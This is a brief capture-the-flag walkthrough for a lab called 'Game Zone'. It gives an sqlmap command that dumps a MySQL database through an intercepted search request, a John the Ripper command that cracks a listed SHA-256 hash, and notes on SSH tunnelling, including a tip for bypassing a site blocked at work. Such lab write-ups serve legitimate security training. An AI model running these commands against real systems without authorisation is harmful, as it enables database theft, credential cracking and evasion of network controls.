# Game Zone

## Task 3 

- First intercept the search bar by using Burp Suite.
- Output the request from Burp Suite to the text file
- Run following command
```bash
# -r uses the intercepted request you saved earlier
# --dbms tells SQLMap what type of database management system it is
# --dump attempts to outputs the entire database
sqlmap -r request.txt --dbms=mysql --dump
```

## Task 4 

Cracking the hash

`ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

```bash 
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

## Task 5 

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do `ssh -L 9000:imgur.com:80 user@example.com`. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.


For finding socket running on a host we can run `ss -tulpn`.

```
Argument	Description
-t	        Display TCP sockets
-u	        Display UDP sockets
-l	        Displays only listening sockets
-p      	Shows the process using the socket
-n      	Doesn't resolve service names
``````
